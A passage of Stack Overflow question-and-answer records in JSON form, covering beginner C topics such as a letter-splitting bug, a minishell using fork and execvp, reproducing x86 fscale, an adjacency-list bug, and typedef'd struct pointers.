<code>strlen()</code>.  It is defined in <code>&lt;stdint.h&gt;</code>.  None the less, using <code>int</code> will almost always work <em>(on most systems a string would have to be 'yooooge' for its length to be bigger than an int can hold)</em>.</p>\n\n<p>The variable <code>c</code> is declared as <code>int</code> instead of <code>char</code> because <code>int</code> is the proper type for the <code>isXXXXX()</code> functions <em>(which are defined in <code>&lt;ctype.h&gt;</code>)</em>.  It is also a good habit to get into because of the parallels between this loop and another common idiom <code>while ((c = fgetc(fp)) != EOF) ...</code>.</p>\n"}], "owner": {"reputation": 19, "user_id": 5698739, "user_type": "registered", "accept_rate": 0, "profile_image": "https://graph.facebook.com/1125587674121165/picture?type=large", "display_name": "Ofek Ezon", "link": "https://stackoverflow.com/users/5698739/ofek-ezon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 66, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1457615753, "creation_date": 1457558658, "question_id": 35902911, "link": "https://stackoverflow.com/questions/35902911/program-prints-unrelated-chars", "title": "Program prints unrelated chars", "body": "<p>I wanted to split an array to 2 arrays that the first one contains the lowercased letters of the original array and the second one contains the uppercased letters and from some reason it prints some unrelated chars.</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>#include &lt;stdio.h&gt;\r\n#include &lt;string.h&gt;\r\n\r\n#define LEN 8\r\nint main(void)\r\n{\r\n\tchar str[] = \"SHaddOW\";\r\n\tchar smallStr[LEN], bigStr[LEN]; \r\n\tint i = 0;\r\n\tint indexSmall = 0;\r\n\tint indexBig = 0;\r\n\r\n\tfor (i = 0; i &lt;= LEN; i++)\r\n\t{\r\n\t\tif (str[i] &lt;= 'Z')\r\n\t\t{\r\n\t\t\tsmallStr[indexSmall] = str[i];\r\n\t\t\tindexSmall++;\r\n\t\t}\r\n\t\tif (str[i] &gt;= 'Z')\r\n\t\t{\r\n\t\t\tbigStr[indexBig] = str[i];\r\n\t\t\tindexBig++;\r\n\t\t}\r\n\t}\r\n\r\n\tprintf(\"1: \");\r\n\tputs(smallStr);\r\n\tprintf(\"2: \");\r\n\tputs(bigStr);\r\n\r\n\tsystem(\"PAUSE\");\r\n\treturn 0;\r\n}</code></pre>\r\n</div>\r\n</div>\r\n</p>\n"}, {"tags": ["c", "shell", "fork", "exec"], "comments": [{"owner": {"reputation": 3765, "user_id": 459615, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73f4c8c6dee5c7decf6434296f0fce47?s=128&d=identicon&r=PG", "display_name": "Kurt Stutsman", "link": "https://stackoverflow.com/users/459615/kurt-stutsman"}, "edited": false, "score": 0, "creation_date": 1457558645, "post_id": 35902836, "comment_id": 59466137, "body": "Actually let me rephrase that. You only need to call <code>exit(0)</code> after the <code>execvp()</code> fails because the process will be running the exec program and not your code."}, {"owner": {"reputation": 33, "user_id": 4860801, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/29975ee69ef612512743c99b668a2554?s=128&d=identicon&r=PG&f=1", "display_name": "spicelord", "link": "https://stackoverflow.com/users/4860801/spicelord"}, "reply_to_user": {"reputation": 3765, "user_id": 459615, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73f4c8c6dee5c7decf6434296f0fce47?s=128&d=identicon&r=PG", "display_name": "Kurt Stutsman", "link": "https://stackoverflow.com/users/459615/kurt-stutsman"}, "edited": false, "score": 0, "creation_date": 1457559080, "post_id": 35902836, "comment_id": 59466408, "body": "So I only want exit(0) inside my if statement if it fails?"}, {"owner": {"reputation": 3765, "user_id": 459615, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73f4c8c6dee5c7decf6434296f0fce47?s=128&d=identicon&r=PG", "display_name": "Kurt Stutsman", "link": "https://stackoverflow.com/users/459615/kurt-stutsman"}, "edited": false, "score": 0, "creation_date": 1457559160, "post_id": 35902836, "comment_id": 59466452, "body": "I&#39;m explaining it poorly but yes the <code>exit(0)</code> needs to be inside of the <code>if</code> with your error message. When you run <code>execvp()</code> and it suceeds, it replaces the process with the new program and never returns to your code. If it fails, then you need to exit the process you created with <code>fork()</code> still."}, {"owner": {"reputation": 33, "user_id": 4860801, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/29975ee69ef612512743c99b668a2554?s=128&d=identicon&r=PG&f=1", "display_name": "spicelord", "link": "https://stackoverflow.com/users/4860801/spicelord"}, "reply_to_user": {"reputation": 3765, "user_id": 459615, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73f4c8c6dee5c7decf6434296f0fce47?s=128&d=identicon&r=PG", "display_name": "Kurt Stutsman", "link": "https://stackoverflow.com/users/459615/kurt-stutsman"}, "edited": false, "score": 0, "creation_date": 1457559363, "post_id": 35902836, "comment_id": 59466560, "body": "Alright I changed my exit(0) placement. It didn&#39;t help the problem and I don&#39;t think it stems from there. It only happens if I close a program that executed properly."}, {"owner": {"reputation": 3765, "user_id": 459615, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73f4c8c6dee5c7decf6434296f0fce47?s=128&d=identicon&r=PG", "display_name": "Kurt Stutsman", "link": "https://stackoverflow.com/users/459615/kurt-stutsman"}, "edited": false, "score": 0, "creation_date": 1457559435, "post_id": 35902836, "comment_id": 59466607, "body": "No, that&#39;s a problem unrelated to your main question."}], "answers": [{"comments": [{"owner": {"reputation": 33, "user_id": 4860801, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/29975ee69ef612512743c99b668a2554?s=128&d=identicon&r=PG&f=1", "display_name": "spicelord", "link": "https://stackoverflow.com/users/4860801/spicelord"}, "edited": false, "score": 0, "creation_date": 1457559546, "post_id": 35903113, "comment_id": 59466674, "body": "how would I check for the file existing before forking?"}, {"owner": {"reputation": 3765, "user_id": 459615, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73f4c8c6dee5c7decf6434296f0fce47?s=128&d=identicon&r=PG", "display_name": "Kurt Stutsman", "link": "https://stackoverflow.com/users/459615/kurt-stutsman"}, "reply_to_user": {"reputation": 33, "user_id": 4860801, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/29975ee69ef612512743c99b668a2554?s=128&d=identicon&r=PG&f=1", "display_name": "spicelord", "link": "https://stackoverflow.com/users/4860801/spicelord"}, "edited": false, "score": 0, "creation_date": 1457559631, "post_id": 35903113, "comment_id": 59466731, "body": "Well if you only allow for it in the current directory, you&#39;d have to use <code>readdir()</code> to find it and verify the user has perms to execute it. You will still likely run into problems with output from the program getting mixed with your prompts though. I think you&#39;ll have to use pipes to prevent it entirely."}], "tags": [], "owner": {"reputation": 3765, "user_id": 459615, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73f4c8c6dee5c7decf6434296f0fce47?s=128&d=identicon&r=PG", "display_name": "Kurt Stutsman", "link": "https://stackoverflow.com/users/459615/kurt-stutsman"}, "is_accepted": false, "score": 0, "last_activity_date": 1457559391, "creation_date": 1457559391, "answer_id": 35903113, "question_id": 35902836, "link": "https://stackoverflow.com/questions/35902836/dummy-shell-in-c-get-bugged-after-closing-external-process/35903113#35903113", "title": "Dummy Shell in C get bugged after closing external process", "body": "<p>You cannot expect that the error message will always print before your prompt. The forked process is running in parallel with your main program. The order in which the output to stdout from the two programs occur is dependent upon how the OS scheduler runs the processes.</p>\n\n<p>I think most real shells like bash actually do the check for the file existing in the main process before doing the <code>fork()</code>. Alternatively you could use <code>pipe()</code> and manually redirect the output. Then you can enforce flushing the entire contents before doing your prompt.</p>\n"}], "owner": {"reputation": 33, "user_id": 4860801, "user_type": "registered", "accept_rate": 20, "profile_image": "https://www.gravatar.com/avatar/29975ee69ef612512743c99b668a2554?s=128&d=identicon&r=PG&f=1", "display_name": "spicelord", "link": "https://stackoverflow.com/users/4860801/spicelord"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 76, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1457559391, "creation_date": 1457558403, "question_id": 35902836, "link": "https://stackoverflow.com/questions/35902836/dummy-shell-in-c-get-bugged-after-closing-external-process", "title": "Dummy Shell in C get bugged after closing external process", "body": "<p>I am writing a shell for an assignment in C. My only problem now is that when I call an external program with execvp() and then close is using CTRL + C, any further commands that I send are printed after the prompt not before it. I made an dummy program that is just an infinite loop to test this.</p>\n\n<p>So after closing this program if I try and run a program that doesn't exist, it will print out<br>\nMINISHELL (cwd) $: and then a blank line<br>\nand then it will print my error message saying that I have entered a program that does not exist and then it will not print a prompt since it already has. So It ends with an empty new line and it appears that the program has not ended but it actually has. </p>\n\n<p>It ONLY does this after I have closed a non terminating program with CTRL + C. Otherwise it works fine executing programs. Am I not using close() somewhere to close a file descriptor? I am not sure. Any help is appreciated. Thank you.</p>\n\n<pre><code>#include \"minishell.h\"\n\n\nvoid intHandler(int sig)\n{\n    my_char('\\n');\n}\n\nint main(int argc, char **argv)\n{\n    int n;\n    int pid = 0;\n    char* s = (char*)malloc(256*sizeof(char));\n    char cwd[1024];\n    char** input;\n\n    while (1)\n    {\n        signal(SIGINT, intHandler);\n\n        my_str(\"MINISHELL:\");\n\n        if (getcwd(cwd, sizeof(cwd)) != NULL)\n            my_str(cwd);\n\n        else\n        {\n            my_str(\"Error in current directory\");\n            return -1;\n        }\n\n        my_str(\" $: \");\n        n = read(0, s, 256);\n        s[n] = '\\0';\n\n        if (n &gt; 1)\n        {\n            input = my_str2vect(s);\n            if (my_strcmp(input[0], \"cd\") == 0)\n            {\n                /*CHANGE DIRECTORY*/\n                if (input[1] != '\\0')\n                {\n                    if (chdir(input[1]) &lt; 0)\n                        my_str(\"MINISHELL: Error in path. Make sure the directory exists.\\n\");\n                }\n\n                else\n                    my_str(\"MINISHELL: Error. No directory specified.\\n\");\n            }\n\n            else if (my_strcmp(input[0], \"help\") == 0)\n            {\n                /*HELP*/\n                my_str(\"\\nMINISHELL COMMANDS:\\n\\ncd *directory\\nChanges the current working directory to *directory\\n\\nexit\\nExits the minishell\\n\\nhelp\\nPrints a help message listing the built in commands\\n\\n\");\n            }\n\n            else if (my_strcmp(input[0], \"exit\") == 0)\n            {\n                /*EXIT*/\n                my_str(\"Thank you for using MINISHELL\\n\");\n                exit(0);\n            }\n\n            else if (input[0] != NULL)\n            {\n                /*EXECUTE AN EXTERNAL PROGRAM*/\n                if ((pid = fork()) &lt; 0)\n                    my_str(\"MINISHELL: Error forking\\n\");\n\n                else if (pid &gt; 0)\n                {\n                    wait(NULL);\n                }\n\n                else\n                {\n                    if (execvp(input[0], input) &lt; 0)\n                    {\n                        my_str(\"MINISHELL: Error. Program does not exist in current directory.\\n\");\n                    }\n\n                    else\n                    {\n                        exit(0);\n                        close(0);   \n                    }\n                }\n            }\n\n            else\n            {\n                my_str(\"MINISHELL: Error reading command. Type help to see available commands.\");\n            }\n        }\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "assembly", "floating-point", "x86", "reverse-engineering"], "comments": [{"owner": {"reputation": 11, "user_id": 6041761, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/70b4deaedd2b199f0b951939c3ed44b3?s=128&d=identicon&r=PG&f=1", "display_name": "szajc", "link": "https://stackoverflow.com/users/6041761/szajc"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1457558854, "post_id": 35902813, "comment_id": 59466269, "body": "Thanks but it does not tell me much. If fscale doesST(0) = ST(0) * 2RoundTowardZero(ST(1)) should I do 0.8584 * (2 * 31) ?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1457559103, "post_id": 35902813, "comment_id": 59466421, "body": "I was just remarking on the fact that the values you show for <code>R4</code> exceed the significance for <code>float</code> type, the term you used, in fact it could be <code>long double</code> as you show 80 bits."}, {"owner": {"reputation": 11, "user_id": 6041761, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/70b4deaedd2b199f0b951939c3ed44b3?s=128&d=identicon&r=PG&f=1", "display_name": "szajc", "link": "https://stackoverflow.com/users/6041761/szajc"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1457559497, "post_id": 35902813, "comment_id": 59466646, "body": "So it is double not a float. But how to translate it to C to get the same result?"}, {"owner": {"reputation": 19034, "user_id": 780717, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/eead3a6ab011b880ca6ec354ca00f0b3?s=128&d=identicon&r=PG", "display_name": "njuffa", "link": "https://stackoverflow.com/users/780717/njuffa"}, "edited": false, "score": 2, "creation_date": 1457559525, "post_id": 35902813, "comment_id": 59466657, "body": "It does not provide exactly the same functionality, but I would suggest looking at the standard math function <code>ldexp()</code>."}, {"owner": {"reputation": 11, "user_id": 6041761, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/70b4deaedd2b199f0b951939c3ed44b3?s=128&d=identicon&r=PG&f=1", "display_name": "szajc", "link": "https://stackoverflow.com/users/6041761/szajc"}, "edited": false, "score": 0, "creation_date": 1457559715, "post_id": 35902813, "comment_id": 59466780, "body": "Thanks! That&#39;s what I was looking for."}, {"owner": {"reputation": 7454, "user_id": 3622813, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Ndlyo.jpg?s=128&g=1", "display_name": "blabb", "link": "https://stackoverflow.com/users/3622813/blabb"}, "edited": false, "score": 0, "creation_date": 1457564173, "post_id": 35902813, "comment_id": 59469013, "body": "not c but c# (powershell) &quot;{0:R20}&quot; -f (0.8584234248846768147 * [system.math]::pow(2,[system.math]::Floor(31.2)))   , 1843450267.9999998"}], "owner": {"reputation": 11, "user_id": 6041761, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/70b4deaedd2b199f0b951939c3ed44b3?s=128&d=identicon&r=PG&f=1", "display_name": "szajc", "link": "https://stackoverflow.com/users/6041761/szajc"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 290, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1457558645, "creation_date": 1457558314, "last_edit_date": 1457558645, "question_id": 35902813, "link": "https://stackoverflow.com/questions/35902813/x86-assembly-how-to-reproduce-fscale-in-c", "title": "x86 Assembly, how to reproduce fscale in C", "body": "<p>Having float numbers 31.0 and 0.85842... how can I reproduce following fscale operation in C to get the same result of 1843450267.9 ?</p>\n\n<pre><code>(gdb) info float\n  R7: Valid   0x3fff8000000000000000 +1\n  R6: Valid   0x3fff8000000000000000 +1\n  R5: Valid   0x4003f800000000000000 +31\n=&gt;R4: Valid   0x3ffedbc1a337fffff775 +0.8584234248846768147\n\n(gdb) x/i $eip\n0x11212 &lt;xxx&gt;:  fscale\n(gdb) si\n(gdb) info float\n  R7: Valid   0x3fff8000000000000000 +1\n  R6: Valid   0x3fff8000000000000000 +1\n  R5: Valid   0x4003f800000000000000 +31\n=&gt;R4: Valid   0x401ddbc1a337fffff775 +1843450267.999999745\n</code></pre>\n"}, {"tags": ["c", "adjacency-list"], "answers": [{"comments": [{"owner": {"reputation": 306, "user_id": 4531112, "user_type": "registered", "accept_rate": 59, "profile_image": "https://graph.facebook.com/1025390600811463/picture?type=large", "display_name": "Brandon Tomblinson", "link": "https://stackoverflow.com/users/4531112/brandon-tomblinson"}, "edited": false, "score": 0, "creation_date": 1457559051, "post_id": 35902983, "comment_id": 59466395, "body": "Yup I literally just noticed that right before I saw this answer, thanks for the keen eye! Its usually always the easy stuff! :)"}, {"owner": {"reputation": 16382, "user_id": 5507349, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/IaCUb.jpg?s=128&g=1", "display_name": "Edgar Rokj\u0101n", "link": "https://stackoverflow.com/users/5507349/edgar-rokj%c4%81n"}, "reply_to_user": {"reputation": 306, "user_id": 4531112, "user_type": "registered", "accept_rate": 59, "profile_image": "https://graph.facebook.com/1025390600811463/picture?type=large", "display_name": "Brandon Tomblinson", "link": "https://stackoverflow.com/users/4531112/brandon-tomblinson"}, "edited": false, "score": 0, "creation_date": 1457559443, "post_id": 35902983, "comment_id": 59466612, "body": "@BrandonTomblinson It&#39;s always better to put such code fragments inside separate functions to avoid code duplication and copy-paste bugs. Good luck!"}], "tags": [], "owner": {"reputation": 16382, "user_id": 5507349, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/IaCUb.jpg?s=128&g=1", "display_name": "Edgar Rokj\u0101n", "link": "https://stackoverflow.com/users/5507349/edgar-rokj%c4%81n"}, "is_accepted": true, "score": 0, "last_activity_date": 1457558873, "creation_date": 1457558873, "answer_id": 35902983, "question_id": 35902584, "link": "https://stackoverflow.com/questions/35902584/having-trouble-creating-an-adjacency-list/35902983#35902983", "title": "Having trouble creating an adjacency list", "body": "<p>In your <code>create_new_edge</code> function in the second <code>if</code>-statement you try to add <code>new1</code>. I think it's a copy-paste bug and you should change it to <code>new</code>.</p>\n\n<pre><code>if ((head +vertex2 - 1)-&gt;edge  == NULL) {\n    (head +vertex2 - 1)-&gt;edge  = new;\n} else {\n    edge* temp = (head +vertex2 - 1)-&gt;edge ;\n    while (temp != NULL) {\n        if (temp-&gt;nextedge == NULL) {\n            temp-&gt;nextedge = new1; // Change here new1 to new\n            break;\n        } else {\n             emp = temp-&gt;nextedge;\n        }\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 306, "user_id": 4531112, "user_type": "registered", "accept_rate": 59, "profile_image": "https://graph.facebook.com/1025390600811463/picture?type=large", "display_name": "Brandon Tomblinson", "link": "https://stackoverflow.com/users/4531112/brandon-tomblinson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 40, "favorite_count": 0, "accepted_answer_id": 35902983, "answer_count": 1, "score": 0, "last_activity_date": 1457558873, "creation_date": 1457557491, "last_edit_date": 1457558245, "question_id": 35902584, "link": "https://stackoverflow.com/questions/35902584/having-trouble-creating-an-adjacency-list", "title": "Having trouble creating an adjacency list", "body": "<p>I am trying to represent a graph using an adjacency list, but I am currently struggling with it. For some reason the edges are getting assigned to the wrong vertexes and I can't figure out why. I step through the code and the first 3 vertex pairs are added just fine but for some reason on the 4th nothing works right and I end up creating multiple new edges and not even the values of them are correct. A sample input is below as well as the C code. Anyone know why this might be happening? Note that   </p>\n\n<pre><code>void print_distance(vertex*, int);\n    int check_an_edge(edge*);\nvoid free_head(vertex*); \n</code></pre>\n\n<p>have not been implemented but free_head is used to free the entire list</p>\n\n<pre>\n5\n(2,3)\n(1,4)\n(1,3)\n(3,4)\n(4,5)\n</pre>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include \"input_error.h\"\n#define VertexToSearch 1\n\ntypedef struct node {\n    int value;\n    struct node* nextedge;\n} edge;\n\ntypedef struct node1 {\n    int vertexnumber;\n    int distance;\n    struct node* edge;\n} vertex;\n\n\nvertex* load_file(char*);\nvoid create_vertex_list(vertex*, int);\nvoid create_new_edge(int, int, vertex*);\nvoid print_distance(vertex*, int);\nint check_an_edge(edge*);\nvoid free_head(vertex*);\nenum error program_error;\n\nint main(int argc, char** argv) {\n    vertex* array;\n    array = load_file(argv[1]);\n    free_head(array);\n    return 0;\n}\n\nvertex* load_file(char* filename) {\n    int count;\n    int vertex1;\n    int vertex2;\n    FILE* file = fopen(filename, \"r\");\n\n    if (file == NULL) {\n        printf(\"%s did not open\", filename);\n        program_error = FILE_FAILED_TO_OPEN;\n        exit(program_error);\n    }\n\n    fscanf(file, \"%d\", &amp;count);\n    vertex* head = malloc(sizeof(vertex)* count);\n    create_vertex_list(head, count);\n    for (int i = 0; i &lt; count; i++) {\n        fscanf(file, \"\\n(%d,%d)\", &amp;vertex1, &amp;vertex2);\n        create_new_edge(vertex1, vertex2, head);\n    }\n    fclose(file);\n    return head;\n}\n\nvoid create_vertex_list(vertex head[], int count) {\n    vertex *new_node;\n    for (int i = 0; i &lt; count; i++) {\n        new_node = malloc(sizeof (vertex));\n        new_node-&gt;vertexnumber = i + 1;\n        new_node-&gt;edge = NULL;\n        new_node-&gt;distance = -1;\n\n        *(head +i)= *new_node;\n    }\n}\n\nvoid create_new_edge(int vertex1, int vertex2, vertex* head) {\n    edge* new = malloc(sizeof (edge));\n    edge* new1 = malloc(sizeof (edge));\n    new-&gt;value = vertex1;\n    new1-&gt;value = vertex2;\n    new-&gt;nextedge = NULL;\n    new-&gt;nextedge = NULL;\n    if ((head +vertex1 - 1)-&gt;edge == NULL) {\n        (head +vertex1 - 1)-&gt;edge  = new1;\n    } else {\n        edge* temp = (head +vertex1 - 1)-&gt;edge;\n        while (temp != NULL) {\n            if (temp-&gt;nextedge == NULL) {\n                temp-&gt;nextedge = new1;\n                break;\n            } else {\n                temp = temp-&gt;nextedge;\n            }\n        }\n    }\n    if ((head +vertex2 - 1)-&gt;edge  == NULL) {\n        (head +vertex2 - 1)-&gt;edge  = new;\n    } else {\n        edge* temp = (head +vertex2 - 1)-&gt;edge ;\n        while (temp != NULL) {\n            if (temp-&gt;nextedge == NULL) {\n                temp-&gt;nextedge = new1;\n                break;\n            } else {\n                temp = temp-&gt;nextedge;\n            }\n        }\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "pointers", "struct", "typedef"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1457557279, "post_id": 35902440, "comment_id": 59465365, "body": "Don&#39;t <code>typedef</code> pointers! This is a guarantee for confusion, as it hides the different semantics. Just <code>typedef</code> the <code>struct</code> itself."}, {"owner": {"reputation": 67, "user_id": 2084088, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/17e533d8bb7adab823a2a16b2553f1bf?s=128&d=identicon&r=PG", "display_name": "afr0ck", "link": "https://stackoverflow.com/users/2084088/afr0ck"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1457557609, "post_id": 35902440, "comment_id": 59465548, "body": "I know its not recommended to typedef a pointer but i have to do so for a certain reason.Based on that supposition,how can i do it ? @Olaf"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1457565101, "post_id": 35902440, "comment_id": 59469417, "body": "<code>typedef</code>-ing pointers is legal in C.  Its has rare good uses, if any.  I find that it is better to not use that construct.  Yet asking about how to do it does not make this post a poor question."}], "answers": [{"tags": [], "owner": {"reputation": 34922, "user_id": 586873, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/11ba1f932f0af556969448ffba230d9a?s=128&d=identicon&r=PG", "display_name": "Grzegorz Szpetkowski", "link": "https://stackoverflow.com/users/586873/grzegorz-szpetkowski"}, "is_accepted": false, "score": 2, "last_activity_date": 1457558478, "last_edit_date": 1457558478, "creation_date": 1457557710, "answer_id": 35902653, "question_id": 35902440, "link": "https://stackoverflow.com/questions/35902440/declaring-a-pointer-to-a-structure-in-its-field/35902653#35902653", "title": "Declaring a pointer to a structure in its field", "body": "<p>It can be accomplished using <em>forward declaration</em> of <code>struct</code>. Here is an example code, that realizes that concept:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nstruct app;\ntypedef struct app* appPtr;\n\nstruct app \n{\n   char *data;\n   appPtr ptr;\n};\n\nint main(void)\n{\n   struct app myApp = { \"myApp\", NULL };\n\n   printf(\"%s, %p\\n\", myApp.data, (void *) myApp.ptr);\n   return 0;\n}\n</code></pre>\n\n<p>However, as mentioned in question's comments I wouldn't recommend it as proper practice, because it obfuscates the code and things go messy with more levels of indirection.</p>\n"}], "owner": {"reputation": 67, "user_id": 2084088, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/17e533d8bb7adab823a2a16b2553f1bf?s=128&d=identicon&r=PG", "display_name": "afr0ck", "link": "https://stackoverflow.com/users/2084088/afr0ck"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 56, "favorite_count": 0, "closed_date": 1457568092, "answer_count": 1, "score": -1, "last_activity_date": 1457558478, "creation_date": 1457557051, "question_id": 35902440, "link": "https://stackoverflow.com/questions/35902440/declaring-a-pointer-to-a-structure-in-its-field", "closed_reason": "Needs details or clarity", "title": "Declaring a pointer to a structure in its field", "body": "<p>I need to typedef the structure pointer then use the new type in its field.</p>\n\n<p>I mean instead of doing :</p>\n\n<pre><code>struct app \n{\n   char *data;\n   struct app *ptr;\n}\n</code></pre>\n\n<p>I need to typedef somewhere <code>typedef app* appPtr;</code> then use it like:</p>\n\n<pre><code>struct app \n{\n   char *data;\n   appPtr ptr;\n}\n</code></pre>\n\n<p>How can i do such a thing ?</p>\n\n<p>PS:i need to use both <code>appPtr</code> &amp; <code>app</code> types.</p>\n"}, {"tags": ["c++", "c", "char"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 3, "creation_date": 1457557258, "post_id": 35902421, "comment_id": 59465352, "body": "<code>int x = &#39;0123&#39;;</code> although obscurely legal, is not what you want --&gt; <code>int x = 123;</code>"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1457557492, "post_id": 35902421, "comment_id": 59465488, "body": "&quot;it doesn&#39;t work properly.&quot; lacks detail.  What did you see, what did you expect?  When I run the code, I get what I see which <i>may</i> be the same as you, may not."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1457557518, "post_id": 35902421, "comment_id": 59465504, "body": "...or perhaps <code>int test = atoi(&quot;0123&quot;);</code>"}, {"owner": {"reputation": 9301, "user_id": 4944425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05592a58619d128e2eee1c3c17801e76?s=128&d=identicon&r=PG&f=1", "display_name": "Bob__", "link": "https://stackoverflow.com/users/4944425/bob"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1457557627, "post_id": 35902421, "comment_id": 59465563, "body": "@WeatherVane I honestly thought <code>int x = &#39;0123&#39;;</code> wouldn&#39;t even compile. Obscure indeed."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 0, "creation_date": 1457557628, "post_id": 35902421, "comment_id": 59465564, "body": "Did you really mean a single <i>character</i> constant <code>&#39;0123&#39;</code> with multiple characters jammed into it, or did you perhaps mean <code>&quot;0123&quot;</code>?"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 9301, "user_id": 4944425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05592a58619d128e2eee1c3c17801e76?s=128&d=identicon&r=PG&f=1", "display_name": "Bob__", "link": "https://stackoverflow.com/users/4944425/bob"}, "edited": false, "score": 0, "creation_date": 1457557742, "post_id": 35902421, "comment_id": 59465622, "body": "@Bob__ curiously enough, it was chux who pointed that out to me previously - and he just commented soon after I did!"}, {"owner": {"reputation": 23, "user_id": 6041694, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4fd5c5c8739b36162519979f1f9aba78?s=128&d=identicon&r=PG&f=1", "display_name": "Prodajem Dom", "link": "https://stackoverflow.com/users/6041694/prodajem-dom"}, "edited": false, "score": 1, "creation_date": 1457557872, "post_id": 35902421, "comment_id": 59465695, "body": "Hi, this is multi-character constant. I didn&#39;t mean &quot;0123&quot;, but &#39;0123&#39;. It compiles, but I don&#39;t know how to convert it to int. I am 